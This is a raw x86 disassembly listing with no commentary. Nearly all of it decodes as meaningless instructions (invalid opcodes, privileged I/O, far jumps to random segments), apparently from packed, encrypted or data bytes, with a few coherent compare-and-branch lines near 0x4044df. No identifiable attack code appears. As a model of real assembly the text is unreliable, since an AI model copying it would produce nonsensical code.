  40412b:	enter  0x3f1b,0x33
  40412f:	and    al,0x4
  404131:	test   BYTE PTR [ebx+edi*1],ah
  404134:	jae    0x4040ff
  404136:	xchg   ecx,eax
  404137:	ins    DWORD PTR es:[edi],dx
  404138:	hlt    
  404139:	dec    esi
  40413a:	into   
  40413b:	jo     0x404153
  40413d:	sub    BYTE PTR [ebx+0x58af3ad9],dl
  404143:	jmp    0x1e39:0xe5655dfa
  40414a:	jmp    0x404119
  40414c:	addr16 mov ds:0xd,eax
  404150:	test   al,0x70
  404152:	jle    0x404169
  404154:	stc    
  404155:	mov    ebx,0x13549ccd
  40415a:	and    eax,0xf817defc
  40415f:	ins    DWORD PTR es:[edi],dx
  404160:	mov    edi,eax
  404162:	into   
  404163:	dec    ebx
  404164:	aad    0xe5
  404166:	js     0x4041e2
  404168:	std    
  404169:	add    DWORD PTR fs:[edx+0x167747b4],ecx
  404170:	mov    edx,eax
  404172:	xchg   ecx,eax
  404173:	mov    ds:0xe56ef3d5,al
  404178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404179:	cmp    BYTE PTR [edi],al
  40417b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40417c:	pop    ss
  40417d:	retf   0x37c8
  404180:	pop    edx
  404181:	hlt    
  404182:	inc    edx
  404183:	cmp    DWORD PTR [edx+ecx*8-0x5e],edx
  404187:	iret   
  404188:	ins    DWORD PTR es:[edi],dx
  404189:	mov    al,0x5b
  40418b:	test   DWORD PTR gs:[ebp-0x336fc7fe],esp
  404192:	in     al,dx
  404193:	lods   eax,DWORD PTR ds:[esi]
  404194:	mov    edx,0xd75087cc
  404199:	add    ecx,DWORD PTR [edx+0x16f7996d]
  40419f:	xchg   edi,eax
  4041a0:	mov    es,WORD PTR [esi]
  4041a2:	jae    0x4041e9
  4041a4:	stc    
  4041a5:	outs   dx,BYTE PTR ds:[esi]
  4041a6:	dec    esp
  4041a7:	sbb    eax,0x6592d5f4
  4041ac:	ror    DWORD PTR [ebx+ecx*1+0x6cfd2304],1
  4041b3:	arpl   WORD PTR [ebp+0x8],bp
  4041b6:	dec    ecx
  4041b7:	pop    esp
  4041b8:	dec    edx
  4041b9:	and    WORD PTR [esi],0xffe3
  4041bd:	or     eax,0x57efd9c2
  4041c2:	xchg   ebx,eax
  4041c3:	sub    eax,0x86fbcf1c
  4041c8:	imul   eax,DWORD PTR [edx],0xb48fea91
  4041ce:	sub    eax,0xecf178cc
  4041d3:	mov    dh,0xbe
  4041d5:	mov    cs,WORD PTR [edx]
  4041d7:	jmp    0xb5ae670
  4041dc:	pop    DWORD PTR [edi+ebp*2+0x69b133d3]
  4041e3:	sbb    BYTE PTR [ebx+ebx*4-0x7c],ah
  4041e7:	inc    esi
  4041e8:	lds    esi,FWORD PTR [eax]
  4041ea:	ds neg edx
  4041ed:	sub    BYTE PTR [edi+0x34321dff],0x3f
  4041f4:	arpl   bp,cx
  4041f6:	inc    ebx
  4041f7:	push   cs
  4041f8:	fs mov dl,dh
  4041fb:	xor    bh,cl
  4041fd:	test   cl,cl
  4041ff:	or     esi,DWORD PTR [esi-0x42]
  404202:	jns    0x404275
  404204:	adc    BYTE PTR [ecx+edx*2],bl
  404207:	and    al,0x7
  404209:	dec    edx
  40420a:	mov    ch,0xa9
  40420c:	pop    edx
  40420d:	fs push ecx
  40420f:	loop   0x404264
  404211:	xlat   BYTE PTR ds:[ebx]
  404212:	test   DWORD PTR [esp+eax*8],edx
  404215:	add    DWORD PTR [esi-0x64],ecx
  404218:	mov    WORD PTR [ecx-0x9315986],cs
  40421e:	add    DWORD PTR [edx],esp
  404220:	test   al,0x72
  404222:	(bad)  
  404223:	xor    BYTE PTR [edx-0xe976a43],bh
  404229:	mov    ebx,0x34035c01
  40422e:	(bad)  
  40422f:	pop    ebx
  404230:	mov    DWORD PTR [eax-0x28b3eb32],edx
  404236:	retf   
  404237:	xor    ecx,ecx
  404239:	js     0x404254
  40423b:	pop    ds
  40423c:	mov    ss,WORD PTR [ebp+0x31]
  40423f:	xor    eax,0xfd80127a
  404244:	pop    esi
  404245:	jno    0x40429a
  404247:	fimul  DWORD PTR [ebp+0x29]
  40424a:	adc    ah,0x49
  40424d:	jne    0x404299
  40424f:	mov    cl,0xae
  404251:	int3   
  404252:	aad    0x28
  404254:	sub    eax,0x6a7d6f6c
  404259:	adc    DWORD PTR [edi-0x23],edx
  40425c:	and    esp,edi
  40425e:	add    bl,BYTE PTR [eax]
  404260:	mov    esp,0x8134b351
  404265:	dec    esp
  404266:	cmp    bh,BYTE PTR [esi+0x74]
  404269:	push   0xfae16246
  40426e:	jecxz  0x4041fb
  404270:	pop    esp
  404271:	inc    ecx
  404272:	cwde   
  404273:	xor    cl,bh
  404275:	stos   DWORD PTR es:[edi],eax
  404276:	xor    al,0xc9
  404278:	sar    BYTE PTR [ecx+edi*4],1
  40427b:	es dec ebx
  40427d:	into   
  40427e:	fld    QWORD PTR [ebx-0x682b9bbd]
  404284:	sbb    al,0xf2
  404286:	sahf   
  404287:	push   ebx
  404288:	xchg   ebp,eax
  404289:	out    0x27,al
  40428b:	out    dx,eax
  40428c:	jbe    0x4042dd
  40428e:	adc    dh,ah
  404290:	icebp  
  404291:	add    DWORD PTR [ebp+ecx*4+0x50032d4f],edi
  404298:	dec    eax
  404299:	lock js 0x4042e0
  40429c:	pop    es
  40429d:	jmp    0xfcbb:0xa6b04d54
  4042a4:	lods   al,BYTE PTR ds:[esi]
  4042a5:	add    DWORD PTR [eax-0x52657550],esp
  4042ab:	sub    ah,cl
  4042ad:	sahf   
  4042ae:	aam    0xc2
  4042b0:	and    al,0xbd
  4042b2:	mov    dl,0x54
  4042b4:	mov    ss,WORD PTR [ecx]
  4042b6:	jmp    0x404260
  4042b8:	cld    
  4042b9:	dec    ecx
  4042ba:	gs xor eax,0xd9401d73
  4042c0:	cmp    ah,ch
  4042c2:	and    bl,BYTE PTR [edi]
  4042c4:	imul   edx,DWORD PTR [eax],0x7b
  4042c7:	and    al,0x1d
  4042c9:	jg     0x404256
  4042cb:	gs adc eax,0x1e461c39
  4042d1:	sbb    BYTE PTR [eax+0x5],ch
  4042d4:	xor    esi,DWORD PTR [esi+eiz*8+0x6f]
  4042d8:	inc    eax
  4042d9:	dec    esp
  4042da:	retf   
  4042db:	or     edi,DWORD PTR [edx]
  4042dd:	retf   
  4042de:	inc    ebp
  4042df:	push   ds
  4042e0:	sti    
  4042e1:	push   0xb13b9628
  4042e6:	xor    eax,0x4826e0b1
  4042eb:	(bad)  
  4042ed:	out    0x7d,eax
  4042ef:	aaa    
  4042f0:	mov    ebp,0x33ea696a
  4042f5:	test   al,0x9e
  4042f7:	div    BYTE PTR [ecx-0x218ccf9a]
  4042fd:	pop    ebp
  4042fe:	add    al,0x85
  404300:	cmp    al,0x85
  404302:	lods   eax,DWORD PTR ds:[esi]
  404303:	or     BYTE PTR [ebp+0x206d14c4],bl
  404309:	aam    0x27
  40430b:	(bad)  
  40430d:	jle    0x4042f1
  40430f:	push   ebp
  404310:	and    edi,esi
  404312:	out    dx,eax
  404313:	mov    esi,DWORD PTR [ebp-0x2b]
  404316:	mov    ch,BYTE PTR es:0x3438a2e4
  40431d:	sub    ebp,0xff617e0f
  404323:	getsec 
  404325:	(bad)  [ebp-0x6d]
  404328:	inc    edi
  404329:	adc    DWORD PTR [eax+0x18],0x81de5175
  404330:	jle    0x40435e
  404332:	fdiv   QWORD PTR [ecx]
  404334:	jmp    0x30aed78d
  404339:	(bad)  
  40433a:	popa   
  40433b:	pop    ebp
  40433c:	test   eax,0xcf66884f
  404341:	jno    0x40436e
  404343:	shl    DWORD PTR [eax],1
  404345:	stc    
  404346:	loope  0x4042dc
  404348:	jmp    0xbbf3f3fe
  40434d:	sbb    BYTE PTR [edx*8-0x4511fa08],bl
  404354:	or     al,0xf7
  404356:	fsub   st(1),st
  404358:	inc    esi
  404359:	add    dl,BYTE PTR [edi-0x5a9db7bb]
  40435f:	call   0x1f9e:0x7ac4b3
  404366:	mov    dh,0x73
  404368:	jae    0x4042fa
  40436a:	or     dl,ch
  40436c:	dec    esp
  40436d:	mov    edi,ebp
  40436f:	xor    edx,DWORD PTR [esi]
  404371:	in     al,0x91
  404373:	(bad)  
  404374:	sbb    BYTE PTR [esi],cl
  404376:	ins    BYTE PTR es:[edi],dx
  404377:	aad    0xe4
  404379:	sub    BYTE PTR [ebx],dl
  40437b:	test   eax,0x8dd73da
  404380:	icebp  
  404381:	mov    eax,0x2d5b0882
  404386:	and    eax,esi
  404388:	call   0xad30:0x33a18fbe
  40438f:	push   0x2287ab8f
  404394:	test   BYTE PTR [edi-0x12],bh
  404397:	add    ecx,eax
  404399:	mov    eax,ds:0x3b25deb5
  40439e:	das    
  40439f:	outs   dx,BYTE PTR ds:[esi]
  4043a0:	mov    al,BYTE PTR [edi-0x5a6d7926]
  4043a6:	je     0x4043aa
  4043a8:	mov    esi,0xe586aa8c
  4043ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043ae:	cmc    
  4043af:	pop    ecx
  4043b0:	jle    0x404348
  4043b2:	add    eax,DWORD PTR [ecx+0x9b16050]
  4043b8:	cmp    eax,0x1259e6f5
  4043bd:	pushf  
  4043be:	std    
  4043bf:	xchg   ecx,eax
  4043c0:	inc    esp
  4043c1:	add    BYTE PTR [ebp-0x40549026],dl
  4043c7:	cld    
  4043c8:	das    
  4043c9:	mov    dl,0x48
  4043cb:	adc    dl,dl
  4043cd:	cmc    
  4043ce:	pop    ebp
  4043cf:	ds xchg ebp,eax
  4043d1:	es add edi,0x87590a01
  4043d8:	stos   BYTE PTR es:[edi],al
  4043d9:	inc    edi
  4043da:	or     al,0xf4
  4043dc:	mov    ebp,0xaea8a9b4
  4043e1:	aam    0x4c
  4043e3:	and    eax,0x877fe258
  4043e8:	call   0xb4f1dba4
  4043ed:	cli    
  4043ee:	dec    ebx
  4043ef:	aad    0x60
  4043f1:	cmp    BYTE PTR [edx],ah
  4043f3:	xor    dh,bl
  4043f5:	stos   DWORD PTR es:[edi],eax
  4043f6:	in     eax,0x3d
  4043f8:	scas   al,BYTE PTR es:[edi]
  4043f9:	mov    dh,0x38
  4043fb:	pop    edx
  4043fc:	xor    esi,edi
  4043fe:	mov    ds:0x5032729c,al
  404403:	repz sub eax,0x1e419f67
  404409:	retf   
  40440a:	loop   0x40439d
  40440c:	adc    DWORD PTR [eax-0x1965d284],ebx
  404412:	lahf   
  404413:	call   0x1fbb19b0
  404418:	clc    
  404419:	jno    0x404406
  40441b:	and    cl,BYTE PTR gs:[eax-0x1384e8c4]
  404422:	xchg   ebp,eax
  404423:	jmp    0x11a5:0xee106916
  40442a:	add    al,al
  40442c:	cmp    al,BYTE PTR [ecx-0x13]
  40442f:	and    al,0xb7
  404431:	pop    ss
  404432:	push   ss
  404433:	adc    DWORD PTR [edi+0x75a25c02],eax
  404439:	and    BYTE PTR [ebx+0x4a],ah
  40443c:	call   0x95cc:0xa7212ec1
  404443:	in     eax,0x26
  404445:	pop    si
  404447:	or     eax,0xb4d45260
  40444c:	test   DWORD PTR [ebp-0x7],ecx
  40444f:	adc    eax,0x4f6ae5ad
  404454:	in     eax,0x9c
  404456:	or     al,BYTE PTR [eax]
  404458:	(bad)  
  404459:	repz loopne 0x4043dc
  40445c:	test   BYTE PTR [ebp-0x22],ah
  40445f:	je     0x4044b6
  404461:	mov    al,0x97
  404463:	loop   0x40449e
  404465:	std    
  404466:	mov    al,0xc3
  404468:	gs addr16 push esi
  40446b:	(bad)  
  40446c:	mov    edi,0xa3855ca3
  404471:	pop    esp
  404472:	pop    eax
  404473:	fsub   DWORD PTR [ebx+eiz*2-0x1e88358a]
  40447a:	dec    ebp
  40447b:	and    cl,BYTE PTR cs:[esi]
  40447e:	addr16 pop esi
  404480:	out    dx,al
  404481:	outs   dx,DWORD PTR ds:[esi]
  404482:	cwde   
  404483:	dec    edx
  404484:	dec    edx
  404485:	xchg   edx,eax
  404486:	mov    al,0xdf
  404488:	add    DWORD PTR [ebx+0x72189c21],eax
  40448e:	ds retf 
  404490:	add    BYTE PTR [edi+ecx*2+0x7a],al
  404494:	xchg   BYTE PTR [ebx-0x48],bl
  404497:	jecxz  0x40441d
  404499:	and    al,0xb8
  40449b:	jno    0x40451a
  40449d:	test   al,0x9
  40449f:	sub    DWORD PTR ds:0xa512fe0c,edi
  4044a5:	xchg   edx,eax
  4044a6:	add    dl,BYTE PTR [edx-0x68]
  4044a9:	dec    esp
  4044aa:	mov    ah,BYTE PTR [esi-0x6f]
  4044ad:	repz in eax,dx
  4044af:	adc    esi,DWORD PTR [ebx]
  4044b1:	mov    esi,0xe61f04cf
  4044b6:	jp     0x404452
  4044b8:	cdq    
  4044b9:	sbb    DWORD PTR [eax+0x53c58987],ecx
  4044bf:	mov    al,ds:0xaf1cd760
  4044c4:	mov    bh,0x50
  4044c6:	mov    ?,WORD PTR [ecx]
  4044c8:	or     cl,bh
  4044ca:	mov    bh,0xc1
  4044cc:	repz sub eax,0x448ac61e
  4044d2:	add    eax,0xff558aa8
  4044d7:	cmp    al,dl
  4044d9:	je     0x404d06
  4044df:	mov    eax,DWORD PTR [ebp+0x8]
  4044e2:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4044e6:	mov    edx,DWORD PTR [ebp+0xc]
  4044e9:	cmp    al,BYTE PTR [edx]
  4044eb:	jne    0x404d2c
  4044f1:	mov    eax,DWORD PTR [ebp-0x8]
  4044f4:	mov    edx,DWORD PTR [ebp+0xc]
  4044f7:	movsx  edx,BYTE PTR [edx]
  4044fa:	jmp    0x4048ef
  4044ff:	enter  0xe53f,0x49
  404503:	cmc    
  404504:	jne    0x40457a
  404506:	mov    edi,0x8f3c5193
  40450b:	add    cl,BYTE PTR [ebx+0x27eb477f]
  404511:	jle    0x404591
  404513:	push   esi
  404514:	jns    0x404594
  404516:	jle    0x40453d
  404518:	or     DWORD PTR [esi-0x45],ebx
  40451b:	cmp    BYTE PTR [edi+0x68eb09e1],0xa9
  404522:	mov    bh,0x3c
  404524:	adc    BYTE PTR [edx],bl
  404526:	data16 mov es,WORD PTR [edx+edx*1-0x12]
  40452b:	cmp    BYTE PTR fs:[edx],al
  40452e:	mov    ds:0xc146b027,eax
  404533:	push   ebx
  404534:	into   
  404535:	mov    esp,0x1e10ca2
  40453a:	push   ebp
  40453b:	fcomi  st,st(0)
  40453d:	aam    0x71
  40453f:	add    BYTE PTR [edi],dh
  404541:	ror    BYTE PTR [eax+eax*1+0x6c],1
  404545:	and    esi,DWORD PTR [ecx-0x9]
  404548:	mov    bl,0xd7
  40454a:	loope  0x4045aa
  40454c:	out    0x99,al
  40454e:	jbe    0x4044ea
  404550:	fwait
  404551:	aas    
  404552:	fisubr DWORD PTR [ecx]
  404554:	(bad)  
  404555:	aad    0x12
  404557:	outs   dx,DWORD PTR ds:[esi]
  404558:	and    eax,0x9a3d8db
  40455d:	mov    bh,0xe5
  40455f:	test   BYTE PTR [ebx],bh
  404561:	lahf   
  404562:	loop   0x40455d
  404564:	and    BYTE PTR cs:[edi-0x2e75b9e8],dh
  40456b:	fisttp DWORD PTR [esi]
  40456d:	daa    
  40456e:	dec    esi
  40456f:	pop    ebp
  404570:	out    dx,eax
  404571:	pop    eax
  404572:	adc    al,0x71
  404574:	enter  0x95c7,0xea
  404578:	lods   al,BYTE PTR ds:[esi]
  404579:	shr    DWORD PTR [ebp-0x26],0xa2
  40457d:	mov    dh,0xc1
  40457f:	pop    ecx
  404580:	shl    DWORD PTR [bp+si-0x6],1
  404584:	push   0xffffff81
  404586:	adc    eax,0x3c6da6fa
  40458b:	mov    ebp,esi
  40458d:	push   ss
  40458e:	pop    edx
  40458f:	xor    ecx,DWORD PTR [eax-0x31831d8f]
  404595:	xchg   ecx,eax
  404596:	aad    0xe6
  404598:	inc    eax
  404599:	mov    bh,0xcf
  40459b:	pop    ebp
  40459c:	fwait
  40459d:	inc    edi
  40459e:	outs   dx,BYTE PTR ds:[esi]
  40459f:	sbb    dh,al
  4045a1:	call   0x713def37
  4045a6:	xchg   esp,eax
  4045a7:	xlat   BYTE PTR ds:[ebx]
  4045a8:	and    BYTE PTR [edi],dh
  4045aa:	call   0x3616ee5e
  4045af:	lods   al,BYTE PTR ds:[esi]
  4045b0:	mov    edx,0xb6a2aa2b
  4045b5:	jmp    0xc39e:0xaf593892
  4045bc:	call   0xed5d81d5
  4045c1:	sbb    BYTE PTR [esi-0x73b25784],0xfd
  4045c8:	test   BYTE PTR [edi],0x6c
  4045cb:	jge    0x404585
  4045cd:	loope  0x40463f
  4045cf:	cwde   
  4045d0:	push   ds
  4045d1:	push   ecx
  4045d2:	add    ecx,ebp
  4045d4:	(bad)  [ebp-0x11]
  4045d7:	xor    ecx,DWORD PTR [esi+0x48d609d3]
  4045dd:	(bad)  
  4045de:	jl     0x4045c3
  4045e0:	xchg   ecx,eax
  4045e1:	nop
  4045e2:	aad    0xa7
  4045e4:	push   es
  4045e5:	scas   eax,DWORD PTR es:[edi]
  4045e6:	in     eax,dx
  4045e7:	pop    edx
  4045e8:	lock out 0x4b,al
  4045eb:	xor    edi,DWORD PTR [bx-0x53]
  4045ef:	cmp    edx,DWORD PTR [edi+0x50]
  4045f2:	mov    dl,bh
  4045f4:	inc    ebx
  4045f5:	scas   al,BYTE PTR es:[edi]
  4045f6:	stos   DWORD PTR es:[edi],eax
  4045f7:	jmp    0x40464d
  4045f9:	stc    
  4045fa:	mov    edi,0x752b0ac
  4045ff:	mov    ebp,ebp
  404601:	popf   
  404602:	mov    cl,0xf9
  404604:	ins    DWORD PTR es:[edi],dx
  404605:	adc    esi,DWORD PTR [eax+0x5156cc4a]
  40460b:	imul   ecx,DWORD PTR [ebp+ebx*8-0x14],0xffffff9d
  404610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404611:	mov    dl,0x1e
  404613:	push   es
  404614:	jle    0x4045ab
  404616:	add    BYTE PTR [edx],bh
  404618:	ret    0x4d2f
  40461b:	outs   dx,BYTE PTR ds:[esi]
  40461c:	cld    
  40461d:	stos   BYTE PTR es:[edi],al
  40461e:	jge    0x40461e
  404620:	jg     0x4045a9
  404622:	jmp    0x40464d
  404624:	pop    ebp
  404625:	in     al,dx
  404626:	mov    ebp,DWORD PTR [eax+esi*4-0x51e7e54]
  40462d:	repz scas al,BYTE PTR es:[edi]
  40462f:	mov    eax,ds:0xe9f54330
  404634:	mov    bh,0x16
  404636:	jle    0x40469a
  404638:	es inc edx
  40463a:	in     eax,0x27
  40463c:	jge    0x4045c6
  40463e:	call   0xe3d343e
  404643:	xchg   esp,eax
  404644:	or     al,0x59
  404646:	pop    ebx
  404647:	aad    0xd8
  404649:	jl     0x4046c2
  40464b:	push   edx
  40464c:	aaa    
  40464d:	sub    al,0xd
  40464f:	sbb    al,0x3
  404651:	inc    esp
  404652:	sbb    dl,BYTE PTR [ecx]
  404654:	fld    TBYTE PTR [edi+0x75]
  404657:	inc    BYTE PTR ss:[ebx]
  40465a:	stos   BYTE PTR es:[edi],al
  40465b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40465c:	add    eax,0xc259a833
  404661:	and    eax,0x89955b28
  404666:	dec    edx
  404667:	sub    DWORD PTR [ecx],ecx
  404669:	jmp    0x57e5f7c2
  40466e:	rcr    BYTE PTR [ebx-0x6e4e7aae],1
  404674:	or     ebp,edx
  404676:	jg     0x404683
  404678:	arpl   WORD PTR [ebp+0x1de4bc4],dx
  40467e:	arpl   WORD PTR [ecx-0x4fee5cfb],sp
  404684:	imul   esi,DWORD PTR [ebx+eiz*4+0x2c],0x17
  404689:	adc    eax,0xfba8cc6f
  40468e:	push   cs
  40468f:	xchg   cl,cl
  404691:	pop    ss
  404692:	inc    esp
  404693:	aad    0x8a
  404695:	pushf  
  404696:	cmp    ecx,edx
  404698:	fmul   QWORD PTR [eax+0x7fcc3cfa]
  40469e:	sbb    al,0xc
  4046a0:	retf   
  4046a1:	arpl   WORD PTR [ebx-0x4f],cx
  4046a4:	cmp    DWORD PTR [edi-0x7b1c611f],edx
  4046aa:	or     al,0xf1
  4046ac:	adc    bh,bh
  4046ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046af:	iret   
  4046b0:	ja     0x404643
  4046b2:	ret    0xfa51
  4046b5:	dec    ecx
  4046b6:	adc    BYTE PTR [edx+esi*2],0xd3
  4046ba:	ret    
  4046bb:	sub    eax,0x9b66e13a
  4046c0:	mov    esp,0x3d82e35b
  4046c5:	(bad)  
  4046c6:	cld    
  4046c7:	imul   eax,ecx,0xeb097d3b
  4046cd:	cmp    BYTE PTR [ebx-0xd],bl
  4046d0:	frstor ds:0xb64c49ad
  4046d6:	xchg   edx,eax
  4046d8:	popf   
  4046d9:	loop   0x4046ca
  4046db:	aam    0xb4
  4046dd:	sahf   
  4046de:	ja     0x40471d
  4046e0:	not    DWORD PTR ds:0x3fe1cad
  4046e6:	clc    
  4046e7:	push   cs
  4046e8:	push   ecx
  4046e9:	push   edi
  4046ea:	push   DWORD PTR [ebx+0x1c0ec40d]
  4046f0:	adc    BYTE PTR [edi],ch
  4046f2:	xor    bl,BYTE PTR [esi]
  4046f4:	cs retf 
  4046f6:	push   edx
  4046f7:	or     esp,DWORD PTR [esi]
  4046f9:	cmp    al,0x34
  4046fb:	jmp    FWORD PTR [edi-0x1d0a1fdc]
  404701:	sahf   
  404702:	fstp   DWORD PTR [ebp+ecx*8+0x6bd71310]
  404709:	inc    eax
  40470a:	xchg   edx,eax
  40470c:	dec    edx
  40470d:	mov    bl,0xeb
  40470f:	xor    BYTE PTR [ebx],bl
  404711:	rcr    DWORD PTR [eax],cl
  404713:	jle    0x404781
  404715:	push   cs
  404716:	out    0xef,eax
  404718:	sub    eax,0xf5b2aa60
  40471d:	push   0x46266d6a
  404722:	push   ebp
  404723:	pop    ss
  404724:	ret    
  404725:	add    esi,DWORD PTR [eax+0x6d]
  404728:	mov    BYTE PTR [ebp+esi*1-0x52],al
  40472c:	ins    BYTE PTR es:[edi],dx
  40472d:	mov    cl,0x27
  40472f:	das    
  404730:	repz add eax,0xd91876e0
  404736:	enter  0xa86a,0x11
  40473a:	mov    edi,0x7567907
  40473f:	es hlt 
  404741:	jmp    0x14cf:0xaeb68e0d
  404748:	imul   edx,DWORD PTR [edx+0x515d8166],0xffffff95
  40474f:	xchg   ebp,eax
  404750:	jae    0x404715
  404752:	sbb    eax,0xf458dde6
  404757:	mov    ebp,0x764e3b44
  40475c:	fwait
  40475d:	lods   eax,DWORD PTR ds:[esi]
  40475e:	test   al,0xa7
  404760:	jnp    0x4047bc
  404762:	mov    edx,0xf233cbac
  404767:	cmp    bh,BYTE PTR [eax+ecx*4]
  40476a:	push   0xaaeddd02
  40476f:	jns    0x404729
  404771:	xchg   ebp,eax
  404772:	imul   edx,DWORD PTR [esi],0x7698ee9
  404778:	push   ebx
  404779:	xor    ebx,DWORD PTR fs:[si-0x1e]
  40477e:	pop    esp
  40477f:	pop    edx
  404780:	mov    eax,0x19724092
  404785:	mov    ds:0x175904f,al
  40478a:	outs   dx,BYTE PTR ds:[esi]
  40478b:	and    eax,0x1742c07
  404790:	sahf   
  404791:	data16 adc BYTE PTR ds:0xf52ae825,ch
  404798:	push   ebx
  404799:	enter  0x1529,0x12
  40479d:	jno    0x404803
  40479f:	adc    cl,BYTE PTR [esi]
  4047a1:	fnstcw WORD PTR [ebx+0x6182c3f]
  4047a7:	cmp    edx,DWORD PTR [ecx-0x2ad62397]
  4047ad:	inc    esp
  4047ae:	jno    0x404748
  4047b0:	out    dx,al
  4047b1:	sub    eax,0x253f86f1
  4047b6:	adc    BYTE PTR [ebx-0xc],ah
  4047b9:	jbe    0x404782
  4047bb:	imul   esi,DWORD PTR [ecx],0xffffff8d
  4047be:	jns    0x4047fc
  4047c0:	shl    BYTE PTR [edi],1
  4047c2:	sbb    eax,0xf9e2b3bd
  4047c7:	mov    ebp,0x9c8ef1cc
  4047cc:	aad    0x5e
  4047ce:	mov    ebx,0xac476337
  4047d3:	push   edi
  4047d4:	fabs   
  4047d6:	or     bl,BYTE PTR [eax-0x51]
  4047d9:	ret    
  4047da:	mov    dh,0xc2
  4047dc:	mov    ebp,esi
  4047de:	enter  0xa3bd,0x79
  4047e2:	mov    ch,0xdd
  4047e4:	dec    eax
  4047e5:	lea    esi,[ebx-0x1a]
  4047e8:	idiv   DWORD PTR [esi-0x67]
  4047eb:	cmp    cl,dh
  4047ed:	add    esi,DWORD PTR cs:[eax+eiz*4+0x9]
  4047f2:	enter  0x4b39,0x4d
  4047f6:	mov    ebp,0xdb1a1943
  4047fb:	(bad)  
  4047fc:	test   DWORD PTR [esp+ecx*2+0x14],0x463a9e2a
  404804:	cmp    ebp,DWORD PTR [edx+edx*8-0x29d9af7c]
  40480b:	jmp    0x266277ad
  404810:	or     dl,BYTE PTR [esi-0x6e01f60c]
  404816:	sti    
  404817:	cmc    
  404818:	adc    al,0x4b
  40481a:	xor    DWORD PTR [edi+0x57],ebx
  40481d:	mov    DWORD PTR [edx],ecx
  40481f:	cdq    
  404820:	push   ecx
  404821:	test   al,0xb
  404823:	mov    BYTE PTR [ebp+0x1e],cl
  404826:	inc    ebp
  404827:	xor    BYTE PTR [esi+0x46035d87],ch
  40482d:	rol    BYTE PTR [ecx-0x6c0e907],0xac
  404834:	push   ebx
  404835:	repz pop es
  404837:	fdiv   QWORD PTR [ecx]
  404839:	cld    
  40483a:	xor    ch,0xc
  40483d:	test   DWORD PTR ds:0x6493f9a1,0xbd671cce
  404847:	cmp    DWORD PTR [ebx+ebp*8-0x4f73b2d4],ebx
  40484e:	or     ch,dl
  404850:	pop    ecx
  404851:	jmp    0x7be88498
  404856:	inc    edi
  404857:	mov    ds:0x7bcdb905,al
  40485c:	ins    DWORD PTR es:[edi],dx
  40485d:	pop    esp
  40485e:	dec    edx
  40485f:	repnz mov dl,0xd8
  404862:	cmc    
  404863:	out    dx,al
  404864:	repz sub ah,BYTE PTR [eax-0x777305d2]
  40486b:	jns    0x4048b8
  40486d:	push   es
  40486e:	and    BYTE PTR [ebx],ch
  404870:	push   edi
  404871:	or     al,0xe0
  404873:	push   ebx
  404874:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404876:	cmp    bl,dl
  404878:	add    eax,0xc038205e
  40487d:	daa    
  40487e:	jge    0x404813
  404880:	mov    ebp,0x4a5e741f
  404885:	dec    edx
  404886:	arpl   WORD PTR [ecx-0x20048d58],di
  40488c:	xchg   esp,eax
  40488d:	out    dx,al
  40488e:	fmul   st(6),st
  404890:	imul   ebx,DWORD PTR ds:0x9edc31e5,0xfffffff7
  404897:	test   DWORD PTR [edi],esi
  404899:	mov    ebx,0xded72cdf
  40489e:	(bad)  
  40489f:	adc    BYTE PTR ds:0xa41355c4,ah
  4048a5:	inc    BYTE PTR [ecx+0x76]
  4048a8:	inc    ebx
  4048a9:	pusha  
  4048aa:	shl    DWORD PTR [ebx-0x1f],cl
  4048ad:	je     0x404910
  4048af:	jo     0x40492a
  4048b1:	mov    ?,eax
  4048b3:	jb     0x404838
  4048b5:	stos   DWORD PTR es:[edi],eax
  4048b6:	dec    edi
  4048b7:	mov    al,0xd2
  4048b9:	leave  
  4048ba:	dec    edx
  4048bb:	les    esp,FWORD PTR [edi]
  4048bd:	scas   al,BYTE PTR es:[edi]
  4048be:	jne    0x4048f9
  4048c0:	and    eax,0xdde39cc9
  4048c5:	js     0x404880
  4048c7:	or     dl,dh
  4048c9:	jne    0x4048d7
  4048cb:	pusha  
  4048cc:	bound  ebx,QWORD PTR [ebp-0x25dab195]
  4048d2:	jne    0x40486a
  4048d4:	add    ch,BYTE PTR [edi-0x78]
  4048d7:	xor    BYTE PTR ds:0xaf8d5fd8,al
  4048dd:	ds addr16 mov cl,0x3
  4048e1:	out    0x62,al
  4048e3:	inc    edx
  4048e4:	bound  edx,QWORD PTR ds:0x745296b9
  4048ea:	sub    DWORD PTR [ebx],0x33b92b05
  4048f0:	rol    DWORD PTR [ebx],0xc6
  4048f3:	cmp    edx,eax
  4048f5:	je     0x404d20
  4048fb:	mov    DWORD PTR [ebp-0x18],0x705fd8c
  404902:	lea    eax,[ebp-0x18]
  404905:	mov    DWORD PTR [ebp-0x14],eax
  404908:	jmp    0x404cfd
  40490d:	push   ecx
  40490e:	(bad)  
  40490f:	fdivrp st(4),st
  404911:	imul   edi,esp,0xff19635d
  404917:	mov    esi,esi
  404919:	sbb    ebx,DWORD PTR [ebp+0x23c3d19e]
  40491f:	jle    0x40499f
  404921:	push   esi
  404922:	jns    0x4049a2
  404924:	jle    0x4049a5
  404926:	add    bh,al
  404928:	mov    ds:0x3e7b5402,eax
  40492d:	sbb    al,0x32
  40492f:	inc    edi
  404930:	xor    bh,BYTE PTR [edx-0x1f]
  404933:	or     eax,0x826e33a7
  404938:	sub    dh,bh
  40493a:	call   0x5001:0x13ee6028
  404941:	push   ss
  404942:	mov    ds:0xff6f2f79,eax
  404947:	cmp    eax,0x55b40c50
  40494c:	test   BYTE PTR [ecx-0x7d],bl
  40494f:	xor    BYTE PTR [ebx-0x36],ah
  404952:	(bad)  
  404953:	fnstenv [edx]
  404955:	add    eax,0xdad689b2
  40495a:	adc    DWORD PTR [ebx],0x35089a0f
  404960:	xor    BYTE PTR [ebp-0x12443c5d],dl
  404966:	mov    cl,0x51
  404968:	mov    ds:0x655c289e,al
  40496d:	cmp    ah,BYTE PTR [edx+0x73]
  404970:	mov    esi,0x64c38cb1
  404976:	or     ch,al
  404978:	xchg   esi,eax
  404979:	sub    dh,cl
  40497b:	and    BYTE PTR [ecx],al
  40497d:	jns    0x40493f
  40497f:	pop    esi
  404980:	push   ebx
